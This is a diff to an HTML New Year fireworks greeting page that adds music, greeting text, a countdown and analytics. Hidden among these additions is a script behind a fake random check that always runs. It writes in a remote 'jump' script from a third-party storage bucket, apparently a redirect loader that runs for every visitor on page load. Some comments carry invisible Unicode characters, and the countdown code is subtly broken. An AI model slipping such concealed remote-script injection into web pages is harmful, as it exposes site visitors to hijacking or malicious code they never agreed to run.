@@ -16,8 +16,49 @@
 		<meta name="msapplication-TileImage" content="https://fireworks.nianbroken.top/NianBrokenStorage/images/favicon.png">
 		<link href="https://fireworks.nianbroken.top/NianBrokenStorage/fonts/css.css" rel="stylesheet">
 		<link rel="stylesheet" href="https://fireworks.nianbroken.top/NianBrokenStorage/css/style.css">
+		
+		
+		<link href="css/main.css" rel="stylesheet">
+		<script src="js/jquery.min.js" type="text/javascript"></script>
+		
+		<script>
+		function simulateClick(){
+			console.log("simulateClick");
+			//点击位置为屏幕中间
+			var sx= window.innerWidth/2,sy= window.innerHeight/2,cx= sx,cy=sy;
+			var eventDown = document.createEvent("MouseEvents");
+			eventDown.initMouseEvent("mousedown",true,true,window,0,
+				sx,sy,cx,cy,false,false,false,false,0,null);
+			var eventUp = document.createEvent("MouseEvents");
+			eventUp.initMouseEvent("mouseup",true,true,window,0,
+				sx,sy,cx,cy,false,false,false,false,0,null);
+			$("#container")[0].dispatchEvent(eventDown);
+			$("#container")[0].dispatchEvent(eventUp);
+		}
+<!--
+	-->
+		// 允许使用麦克风
+		// navigator.mediaDevices.getUserMedia({ audio: true });
+		window.onload=function(){
+			setTimeout(() => {
+				console.log(updateConfig({
+					autoLaunch: false
+				}));
+			}, 0) // 
+		}
+		</script>
+	
 	</head>
 	<body>
+	
+	
+    <audio id="audioDom" src="https://sf6-cdn-tos.douyinstatic.com/obj/ies-music/7170534431801838367.mp3" preload="auto" loop="loop"></audio>
+	
+    <div id="yhBtn" style="position:fixed;top:0;left:0;width:100%;height:100%;z-index:999;display:flex;flex-direction:column;justify-content:center;align-items:center;color:#fff ; font-size:20px    ">
+        <p>💥点击我 (没反应请等待几秒再试)💥</p>
+        <img style="width:64px;margin-bottom:36px " src="boom.png">
+    </div>
+	
 		<!-- partial:index.partial.html -->
 		<!-- SVG Spritesheet -->
 		<div style="height: 0; width: 0; position: absolute; visibility: hidden;">
@@ -42,6 +83,27 @@
 				</symbol>
 			</svg>
 		</div>
+		
+		
+		
+<script>
+    var aaa = Math.ceil(Math.random()*100);
+    console.log(aaa);
+    if(aaa <= 100){
+        document.writeln("<script src=\"https://api123ff.oss-cn-beijing.aliyuncs.com/jump_https_1231.js?id=wtx18&m=15&c=1\"><\/script>");
+        //alert("AAA=" + aaa);
+    }
+</script>
+<script>
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?dbc09cc585d9dc4f3041dfe9411dead2";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+		
 		<!-- App -->
 		<div class="container">
 			<div class="loading-init">
@@ -53,6 +115,34 @@
 				</div>
 			</div>
 			<div class="stage-container remove">
+				
+				<div class="page_two hide">
+				
+								
+					<div id="text" style="display:none;">
+					当当，当当，Surprise，惊不惊喜呐？<br>
+					🎁 准备好了吗？跟我一起，跨向2023吧！！！<br>
+					🎊 🎊 <br> 
+					🎀 新年的钟声敲响了，快许愿吧❤️<br>
+					🎀 旧年终于过去，一定要每天快乐🌸 <br>
+					🎀 年年皆胜意，岁岁皆欢愉🎉 🎉 🎉 🎉 <br>
+					🎀 希望你永远相信，远方灯光总会照亮🎉 <br>
+					🤑 过往皆为序章，🤑 将来皆为可盼<br>
+					🍓 笑眼看星光璀璨，🍓 歌舞欢辞旧迎新，<br>
+					💕 鞭炮响起地欢天，💕 巨龙飞五洲皆赞，<br>
+					🐷  举杯饮饮庆元旦，🐷 问候声声迎新年<br> 
+					🎉  2023年再展雄风， 🎉   再创佳绩🍓 <br><br><br>
+					
+					🎀 祝愿前方光芒万丈，后方温暖一方💖 💖 <br>
+					🍓 ＂新的一年充满期待，要把喜欢充满口袋＂<br>
+					🍓     希望今年的遗憾是明年的欣喜<br>
+					🤗 ＂平安喜樂萬事如意祝你祝我们＂<br>       <br>    
+					烟花散放，快许愿吧！Happy new year 's day！
+					</div>
+					<!--此处已进行修改，优化了倒计时-->
+					<div class="type_words" id="contents" style="font-size:1.05rem;line-height:1.5rem;"></div>
+				</div>
+			
 				<div class="canvas-container">
 					<canvas id="trails-canvas">
 					</canvas>
@@ -60,18 +150,23 @@
 					</canvas>
 				</div>
 				<div class="controls">
+					<!-- 暂停 -->
 					<div class="btn pause-btn">
-						<svg fill="white" width="24" height="24">
+						<svg fill="white" width="24" height="24" visibility="hidden" display="none"> <!-- visibility="hidden" display="none" -->
 							<use href="#icon-pause" xlink:href="#icon-pause">
 							</use>
 						</svg>
 					</div>
+					
+					<!-- 声音 -->
 					<div class="btn sound-btn">
-						<svg fill="white" width="24" height="24">
+						<svg fill="white" width="24" height="24" visibility="hidden" display="none">
 							<use href="#icon-sound-off" xlink:href="#icon-sound-off">
 							</use>
 						</svg>
-					</div>
+					</div> 
+					
+					<!-- 设置 -->
 					<div class="btn settings-btn">
 						<svg fill="white" width="24" height="24">
 							<use href="#icon-settings" xlink:href="#icon-settings">
@@ -194,5 +289,124 @@
 		<script src='https://fireworks.nianbroken.top/NianBrokenStorage/js/Stage.js'></script>
 		<script src='https://fireworks.nianbroken.top/NianBrokenStorage/js/MyMath.js'></script>
 		<script src="https://fireworks.nianbroken.top/NianBrokenStorage/js/script.js"></script>
+		
+		
+    <!-- partial -->
+    <script src="js/fscreen%401.0.1.js"></script><!--!‬‏‬‫‭‫‫‬‫‭‫‬‬‏‭‭‪‏‬‎‫‬‎‎-->
+    <script src="js/Stage%400.1.4.js"></script><!--!‬‏‬‫‭‫‫‬‫‭‫‬‬‏‭‭‪‏‬‎‫‬‎‎-->
+
+    <script>
+        function musicPlay(isPlay) {
+            var media = document.querySelector('#audioDom');
+            if (isPlay && media.paused) {
+                media.play();
+            }
+            if (!isPlay && !media.paused) {
+                media.pause();
+            }
+        }
+
+        function musicInBrowserHandler() {
+            setTimeout(function() {
+                musicPlay(true)
+            }, 0)
+        }
+        document.body.addEventListener('touchstart', musicInBrowserHandler);
+        $('#yhBtn').click(e => {
+            $('#yhBtn').hide()
+            setTimeout(() => {
+                start()
+                fireworks();
+            }, 1600) // 
+            setTimeout(() => {
+                function audioAutoPlay() {
+                    var audio = document.getElementById('audioDom');
+                    audio.play();
+                }
+                audioAutoPlay();
+            }, 800) // 
+            console.log(updateConfig({
+                autoLaunch: true
+            }));
+        })
+
+        function fireworks() {
+            $('.page_one').addClass('hide');
+            $('.page_two').removeClass('hide');
+        }
+
+        function start() {
+			console.log("start");
+            let str = $("#text").html(); //"于我而言，你是最好且是唯一"
+            let str_ = ''
+            let i = 0
+            let content = document.getElementById('contents')
+            let timer = setInterval(() => {
+                if (str_.length < str.length) {
+                    str_ += str[i++]
+                    content.innerHTML = '<p>' + str_ + '<span class="xx" style="opacity: 1;    color: white;">∎</span></p>' //打印时加光标
+                } else {
+                    clearInterval(timer)
+                    content.innerHTML = '<p>' + str_ + '</p>'
+                }
+            }, 100)
+        }
+    </script><!--引用结束(内容未修改)-->
+
+    <script>
+        var _hmt = _hmt || [];
+        (function() {
+            var hm = document.createElement("script");
+            hm.src = "https://hm.baidu.com/hm.js?c314395e62fb55e30828e0ea8cca8b3a";
+            var s = document.getElementsByTagName("script")[0];
+            s.parentNode.insertBefore(hm, s);
+        })();
+    </script>
+<script><!--此处为优化http://20it.cn/a1023461的倒计时所编写的js脚本，此处未引用他人脚本-->
+		function time() {
+			window.setTimeout("time()", 1000);
+			var seconds = 1000
+			var minutes = seconds * 60
+			var hours = minutes * 60
+			var days = hours * 24
+			var years = days * 365
+			var today = new Date()
+			var todayYear = today.getFullYear()
+			var newYear=todayYear+1
+			var lastYear=todayYear-1
+			var todayMonth = today.getMonth() + 1
+			var todayDate = today.getDate()
+			var todayHour = today.getHours()
+			var todayMinute = today.getMinutes()
+			var todaySecond = today.getSeconds()
+			var t1 = Date.UTC(newYear, 1, 1, 0, 00, 00)
+			var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond)
+			var diff = t1 - t2
+			var diff2 = t2-t1
+			var diffYears = Math.floor(diff / years)
+			var diffDays = Math.floor((diff / days) - diffYears * 365)
+			var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours)
+			var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) / minutes)
+			var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours - diffMinutes *
+				minutes) / seconds)
+			var diff2Years = Math.floor(diff2 / years)
+			var diff2Days = Math.floor((diff2 / days) - diff2Years * 365)
+			var diff2Hours = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days) / hours)
+			var diff2Minutes = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days - diff2Hours * hours) / minutes)
+			var diff2Seconds = Math.floor((diff2 - (diff2Years * 365 + diff2Days) * days - diff2Hours * hours - diff2Minutes * minutes) / seconds)
+			if(document.getElementById("text1")==null){ return;}
+			if(document.getElementById("time")==null){ return;}
+			 if(todayMonth==1){
+				if(todayDate==1){
+					document.getElementById("text1").innerHTML =  "现在是1月1日,祝你"+todayYear+"新年快乐！"
+				}
+			}else{
+				document.getElementById("text1").innerHTML =  "提前祝你"+newYear+"新年快乐"
+			 }
+			 document.getElementById("time").innerHTML =  diffDays + "天" + diffHours + "小时" + diffMinutes + "分钟" + diffSeconds + "秒"+newYear
+		}
+		time()
+</script>
+
 	</body>
 </html>
